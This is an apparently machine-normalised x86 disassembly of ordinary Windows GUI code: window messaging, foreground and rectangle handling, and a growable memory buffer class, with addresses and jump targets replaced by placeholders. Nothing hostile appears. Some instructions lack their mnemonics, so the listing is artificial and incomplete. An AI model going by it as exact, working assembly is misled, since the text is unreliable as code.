mov [ ebp - 0x18 ] eax
call sub_45357b
mov esi [ eax + 0x4 ]
call sub_45357b
mov eax [ eax + 0x4 ]
mov ecx [ esi + 0xac ]
mov [ eax + 0x74 ] ecx
call sub_45357b
mov eax [ eax + 0x4 ]
lea ecx [ ebp - 0x40 ]
mov [ eax + 0xac ] ecx
jmp r-xdata
cmp [ ebp - 0x30 ] 0x3
jne r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x1c ]
call sub_45357b
mov eax [ eax + 0x4 ]
mov ebx [ eax + 0x74 ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov ecx [ ebp - 0x14 ]
call sub_44d5b7
mov esi eax
call sub_45357b
mov eax [ eax + 0x4 ]
push [ ebp - 0x2c ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x7c ]
mov ebx eax
call sub_45357b
mov eax [ eax + 0x4 ]
lea ecx [ ebp - 0x40 ]
mov [ eax + 0xac ] ecx
call sub_45357b
mov eax [ eax + 0x4 ]
xor edi edi
push edi
push 0xe108
mov eax [ eax + 0x1c ]
push 0x111
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
call sub_45357b
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x14 ]
mov [ eax + 0xac ] edi
call sub_44d5b7
cmp eax esi
jle r-xdata
lea eax [ ebp - 0x1c ]
push 0x3
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
mov eax [ eax ]
mov esi r--data
push esi
push eax
call sub_42d51e
pop ecx
pop ecx
test eax eax
lea ecx [ ebp - 0x1c ]
setne bl
call sub_442148
test bl bl
jne r-xdata
push [ esi + 0x1c ]
call [ IsIconic@IAT ]
neg eax
sbb eax eax
and eax edi
add eax 0x5
mov ebx eax
cmp ebx 0x1
jne r-xdata
call sub_45175f
test eax eax
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x7c ]
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffffd
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x7
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
push 0x22
lea ecx [ ebp + 0x8 ]
call sub_442621
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
push [ ebp - 0x2c ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x7c ]
call sub_45175f
test eax eax
jne r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push ebx
mov ecx esi
call sub_4417ff
cmp ebx 0x6
je r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x10 ]
mov [ eax + 0xac ] ecx
call sub_45357b
mov eax [ eax + 0x4 ]
push edi
push edi
push 0x10
mov eax [ eax + 0x1c ]
push [ eax + 0x1c ]
call [ PostMessageA@IAT ]
lea eax [ ebp - 0x1c ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x8
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax ebx
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x9
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea eax [ ebp - 0x1c ]
push 0x3
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
mov eax [ eax ]
push esi
push eax
call sub_42d51e
pop ecx
pop ecx
test eax eax
lea ecx [ ebp - 0x1c ]
setne bl
call sub_442148
test bl bl
jne r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
or [ eax + 0x74 ] 0xffffffff
jmp r-xdata
push 0x1
call sub_451750
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffffd
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xa
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
push 0x22
lea ecx [ ebp + 0x8 ]
call sub_442621
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
lea eax [ ebp - 0x1c ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0xb
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax ebx
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xc
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea eax [ ebp - 0x1c ]
push 0x3
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
mov eax [ eax ]
push esi
push eax
call sub_42d51e
pop ecx
pop ecx
test eax eax
lea ecx [ ebp - 0x1c ]
setne bl
call sub_442148
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffffd
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xd
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
push 0x22
lea ecx [ ebp + 0x8 ]
call sub_442621
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x1c ]
push esi
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0xe
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax esi
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xf
call sub_442281
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
sub_44dbdd
mov eax sub_464418
call sub_42dc88
sub esp 0x64
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp eax 0x1
mov ebx [ ecx + 0x8 ]
jle r-xdata
push 0xffffffff
push eax
push 0xf104
call sub_4496ef
jmp r-xdata
mov eax [ ebx ]
push 0x1
push 0x0
mov ecx ebx
call [ eax + 0x80 ]
push 0x0
push 0x7801
lea ecx [ ebp - 0x70 ]
call sub_43ddd5
and [ ebp - 0x10 ] 0x0
mov edi r--data
add esi 0x4
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x70 ]
call sub_43de8a
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x70 ] edi
call sub_43da87
jmp r-xdata
mov ebx [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x70 ] edi
call sub_43da87
sub_44dca9
mov eax sub_46442c
call sub_42dc88
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x1
push 0x1004
lea edx [ ebp - 0x10 ]
push 0xf000
push edx
call [ eax + 0x2c ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_45357b
mov eax [ eax + 0x4 ]
push [ ebp - 0x10 ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44dd21
push esi
mov esi ecx
call sub_44401e
mov eax [ esp + 0x10 ]
and [ esi + 0x14 ] 0x0
mov ecx [ esp + 0xc ]
mov [ esi + 0x10 ] eax
neg eax
sbb eax eax
and [ esi + 0x24 ] 0x0
not eax
and eax ecx
mov [ esi ] r--data
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x18 ] ecx
mov eax esi
pop esi
retn 0xc
sub_44dd5d
mov eax sub_4648a0
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x20 ] edi
mov [ ebp - 0x4 ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call sub_444073
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
call sub_44df44
sub_44ddc8
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov eax ecx
mov edx edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn 0xc
sub_44ddfe
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x18 ]
cmp ebx edi
jbe r-xdata
pop edi
pop esi
pop ebx
retn 0x4
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp edi ebx
jae r-xdata
call sub_43b7b5
mov eax [ esi + 0x20 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x10 ]
mov edx [ esi ]
push edi
push eax
mov ecx esi
call [ edx + 0x58 ]
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x54 ]
jmp r-xdata
add edi eax
cmp edi ebx
jb r-xdata
mov [ esi + 0x20 ] ebx
mov [ esi + 0x18 ] edi
call sub_43b7b5
mov ebx eax
test ebx ebx
jne r-xdata
sub_44de57
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x18 ]
jbe r-xdata
cmp edi [ esi + 0x14 ]
jae r-xdata
mov eax [ esi ]
push edi
call [ eax + 0x64 ]
mov [ esi + 0x1c ] edi
pop edi
pop esi
retn 0x4
mov [ esi + 0x14 ] edi
sub_44de7a
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi + 0x1c ]
cmp ecx eax
jbe r-xdata
pop edi
pop esi
retn 0x8
lea edx [ ecx + edi ]
cmp edx eax
jbe r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi ]
add edx ecx
push edi
push edx
mov ecx esi
push [ esp + 0x14 ]
call [ eax + 0x5c ]
add [ esi + 0x14 ] edi
mov eax edi
sub eax ecx
mov edi eax
sub_44debb
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov eax [ esi + 0x14 ]
add eax edi
cmp eax [ esi + 0x18 ]
jbe r-xdata
mov ecx [ esi + 0x20 ]
mov eax [ esi ]
add ecx [ esi + 0x14 ]
push edi
push [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
add [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x1c ]
jbe r-xdata
mov edx [ esi ]
push eax
call [ edx + 0x64 ]
mov [ esi + 0x1c ] eax
sub_44defd
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push esi
push edi
mov edi ecx
mov esi [ edi + 0x14 ]
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
add esi [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x2
jne r-xdata
test esi esi
jge r-xdata
mov [ edi + 0x14 ] esi
mov eax esi
jmp r-xdata
push 0x0
push 0xffffffff
push 0x9
call sub_444b82
or eax 0xffffffff
mov esi [ edi + 0x1c ]
pop edi
pop esi
pop ebp
retn 0x8
sub_44df44
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x20 ]
mov [ esi + 0x10 ] edi
cmp eax edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
je r-xdata
mov [ esi + 0x20 ] edi
pop edi
pop esi
retn
cmp [ esi + 0x24 ] edi
je r-xdata
mov edx [ esi ]
push eax
call [ edx + 0x60 ]
sub_44df83
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
cmp ebx 0x3
mov esi ecx
jne r-xdata
cmp ebx 0x2
jne r-xdata
push 0x1
pop eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp ebx 0x1
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi + 0x14 ] eax
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x1c ]
jbe r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ esi + 0x14 ]
mov edx [ ebp + 0x10 ]
add eax [ esi + 0x20 ]
cmp ebx 0x1
mov [ edx ] eax
jne r-xdata
mov eax [ esi + 0x14 ]
add eax edi
cmp eax [ esi + 0x18 ]
jbe r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x1c ] eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
add eax edi
cmp ecx eax
jae r-xdata
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x64 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x1c ]
add eax edi
cmp ecx eax
jae r-xdata
mov edi [ esi + 0x18 ]
sub edi [ esi + 0x14 ]
add eax [ esi + 0x20 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ecx
mov ecx [ esi + 0x20 ]
add eax ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
sub eax [ edx ]
add [ esi + 0x14 ] eax
mov eax ecx
mov eax [ ecx ]
pop edi
sub eax [ edx ]
sub_44e066
mov eax sub_464a18
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_44b723
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_44af64
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44e09e
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
mov esi ecx
and eax r-xdata
xor ebx ebx
mov [ esi + 0x64 ] eax
push 0x30
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_42dc30
mov eax [ ebp + 0x14 ]
or edi 0x40000000
add esp 0xc
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x38 ] eax
call sub_45357b
mov eax [ eax + 0x8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax [ eax + 0x1c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x34 ] ebx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push 0x10
mov [ esi + 0x84 ] edi
call sub_44121e
push 0x3c000
call sub_44121e
push [ ebp + 0x8 ]
mov ecx esi
push edi
call sub_43db62
cmp eax ebx
mov [ esi + 0x84 ] ebx
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x40 ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
mov ecx esi
call sub_441746
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
sub ecx [ ebp - 0xc ]
push ebx
push 0x4000000
mov [ esi + 0x78 ] eax
mov [ esi + 0x7c ] ecx
push ebx
mov ecx esi
call sub_441673
push edi
mov ecx esi
call sub_440d85
test eax eax
jne r-xdata
push 0x54
push ebx
push ebx
push ebx
push ebx
push ebx
mov ecx esi
call sub_4417b0
push 0x1
pop eax
sub_44e197
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0x78 ]
mov [ eax ] edx
mov ecx [ ecx + 0x7c ]
mov [ eax + 0x4 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov eax 0x7fff
je r-xdata
mov edx eax
mov edx [ ecx + 0x7c ]
jmp r-xdata
mov ecx [ ecx + 0x78 ]
mov ecx eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
sub_44e1f1
push esi
mov esi ecx
call sub_43e71a
call sub_45357b
mov eax [ eax + 0x1038 ]
test eax eax
je r-xdata
push 0x1
pop eax
mov ecx [ esi + 0x80 ]
test ecx ecx
je r-xdata
mov edx [ eax ]
push ecx
push [ esi + 0x84 ]
mov ecx eax
push esi
call [ edx + 0x20 ]
test eax eax
je r-xdata
pop esi
retn 0x8
sub_44e23c
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov ecx [ edx ]
cmp eax ecx
jge r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jg r-xdata
sub eax ecx
jmp r-xdata
xor eax eax
mov ecx [ esp + 0xc ]
push esi
mov esi [ edx + 0x4 ]
cmp ecx esi
jge r-xdata
mov esi [ edx + 0xc ]
cmp ecx esi
jg r-xdata
sub ecx esi
jmp r-xdata
xor ecx ecx
push ecx
push eax
push edx
call [ OffsetRect@IAT ]
pop esi
retn 0xc
sub_44e298
push ebp
mov ebp esp
sub esp 0x58
push ebx
mov ebx ecx
push esi
push edi
mov [ ebx + 0x88 ] 0x1
call sub_44eb5a
mov ecx [ ebx + 0x84 ]
lea esi [ ebx + 0x84 ]
call sub_4472f3
test al 0x1
je r-xdata
mov eax [ ebx + 0x68 ]
mov ecx [ eax + 0x64 ]
test cl 0x4
je r-xdata
mov ecx [ esi ]
push 0x0
call sub_447329
test cl 0x2
je r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebx + 0x8 ] eax
mov eax [ ecx ]
push 0xa
lea edx [ ebp - 0x18 ]
push esi
push edx
call [ eax + 0xbc ]
mov ecx [ ebx + 0x68 ]
push 0x10
lea edx [ ebp - 0x28 ]
push esi
mov eax [ ecx ]
push edx
call [ eax + 0xbc ]
mov ecx [ ebx + 0x68 ]
push 0x6
lea edx [ ebp - 0x30 ]
push esi
mov eax [ ecx ]
push edx
call [ eax + 0xbc ]
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
add ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x54 ]
add edx ecx
lea edi [ ebx + 0x28 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
movsd [ edi ] [ esi ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add edx eax
mov [ ebp - 0x44 ] ecx
movsd [ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x24 ]
add edx ecx
lea edi [ ebx + 0x38 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x2c ]
add edx eax
add esi ecx
lea edi [ ebx + 0x48 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x40 ] edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
lea edi [ ebx + 0x58 ]
lea esi [ ebp - 0x48 ]
push 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi 0xc40000
lea eax [ ebx + 0x48 ]
push esi
jmp r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
mov esi [ ebx + 0x78 ]
mov eax [ ebp + 0x8 ]
and esi 0xa000
mov ecx [ ebx + 0x68 ]
mov edx esi
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0xc ]
neg edx
sbb edx edx
mov [ ebx + 0x8 ] eax
mov eax [ ecx ]
and edx 0x6
add edx 0xa
push edx
lea edx [ ebp - 0x8 ]
push 0xffffffff
push edx
call [ eax + 0xbc ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push [ eax + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x68 ]
mov [ ebx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x8 ] eax
mov eax [ ecx ]
push 0xa
lea edx [ ebp - 0x30 ]
push 0xffffffff
push edx
call [ eax + 0xbc ]
mov ecx [ ebx + 0x68 ]
push 0x10
lea edx [ ebp - 0x28 ]
push 0xffffffff
mov eax [ ecx ]
push edx
call [ eax + 0xbc ]
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x2c ]
add ecx eax
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x54 ]
add edx ecx
lea edi [ ebx + 0x28 ]
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebx + 0x48 ]
lea esi [ ebp - 0x20 ]
mov edi edx
push 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
add esi eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] esi
add eax ecx
lea edi [ ebx + 0x38 ]
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x14 ] eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edi [ ebx + 0x58 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi 0xc40000
push esi
push edx
jmp r-xdata
push eax
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x38 ]
lea edi [ ebx + 0x38 ]
lea esi [ ebp - 0x38 ]
sub eax ecx
mov [ ebp - 0x48 ] ecx
movsd [ edi ] [ esi ]
cdq
sub eax edx
movsd [ edi ] [ esi ]
mov edx eax
mov eax [ ebp + 0xc ]
sar edx 0x1
sub eax edx
mov edx [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
add edx ecx
mov ecx [ ebp - 0x4 ]
movsd [ edi ] [ esi ]
add ecx eax
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x3c ] ecx
lea edi [ ebx + 0x28 ]
lea esi [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
lea edi [ ebx + 0x28 ]
lea esi [ ebp - 0x38 ]
sub eax ecx
mov [ ebp - 0x44 ] ecx
movsd [ edi ] [ esi ]
cdq
sub eax edx
movsd [ edi ] [ esi ]
mov edx eax
mov eax [ ebp + 0x8 ]
sar edx 0x1
sub eax edx
mov edx [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x48 ] eax
add edx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x40 ] edx
movsd [ edi ] [ esi ]
add eax ecx
lea edi [ ebx + 0x38 ]
mov [ ebp - 0x3c ] eax
lea esi [ ebp - 0x48 ]
jmp r-xdata
call sub_452cfc
push 0x0
lea edi [ ebx + 0x58 ]
push esi
push edi
call sub_452cfc
mov eax [ rw-data ]
mov esi [ InflateRect@IAT ]
neg eax
push eax
mov eax [ rw-data ]
neg eax
push eax
lea eax [ ebx + 0x48 ]
push eax
call esi
mov eax [ rw-data ]
neg eax
push eax
mov eax [ rw-data ]
neg eax
push eax
push edi
call esi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebx + 0x28 ]
push esi
push eax
call sub_44e23c
push edi
lea eax [ ebx + 0x38 ]
push esi
push eax
call sub_44e23c
push edi
lea eax [ ebx + 0x48 ]
push esi
push eax
call sub_44e23c
push edi
lea eax [ ebx + 0x58 ]
push esi
push eax
call sub_44e23c
mov ecx ebx
call sub_44edcc
push edi
push esi
mov ecx ebx
mov [ ebx + 0x74 ] eax
call sub_44e5e4
mov ecx ebx
call sub_44ef2b
pop edi
pop esi
pop ebx
leave
retn 0x8
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebx + 0x48 ]
lea esi [ ebx + 0x28 ]
mov edi eax
push 0x0
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edi [ ebx + 0x58 ]
lea esi [ ebx + 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi 0xc40000
push esi
sub_44e5e4
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ OffsetRect@IAT ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
sub ebx eax
mov eax [ ebp + 0xc ]
sub eax ecx
mov [ ebp - 0x4 ] eax
push eax
lea eax [ esi + 0x28 ]
push ebx
push eax
call edi
push [ ebp - 0x4 ]
lea eax [ esi + 0x48 ]
push ebx
push eax
call edi
push [ ebp - 0x4 ]
lea eax [ esi + 0x38 ]
push ebx
push eax
call edi
push [ ebp - 0x4 ]
lea eax [ esi + 0x58 ]
push ebx
push eax
call edi
mov eax [ ebp + 0x8 ]
cmp [ esi + 0x80 ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
je r-xdata
mov ecx esi
call sub_44edcc
xor eax eax
jmp r-xdata
push 0x0
mov ecx esi
mov [ esi + 0x74 ] eax
call sub_44ec64
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_44e660
cmp [ esp + 0x4 ] 0x11
push esi
mov esi ecx
jne r-xdata
cmp [ esp + 0x8 ] 0x10
jne r-xdata
push [ esp + 0xc ]
lea eax [ esi + 0x80 ]
push eax
call sub_44ed7a
pop esi
retn 0x8
push [ esp + 0xc ]
lea eax [ esi + 0x7c ]
mov ecx esi
push eax
call sub_44ed7a
sub_44e694
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx ecx
call sub_44ec1b
mov eax [ ebx + 0x74 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x78 ]
test al 0x4
jne r-xdata
push esi
push edi
push eax
mov ecx ebx
call sub_44eee3
test [ ebx + 0x75 ] 0x50
mov [ ebp - 0x4 ] eax
lea esi [ ebx + 0x38 ]
jne r-xdata
mov eax [ ebx + 0x70 ]
mov ecx [ ebx + 0x48 ]
and eax 0x40
mov [ ebx + 0xa8 ] ecx
mov ecx [ ebx + 0x4c ]
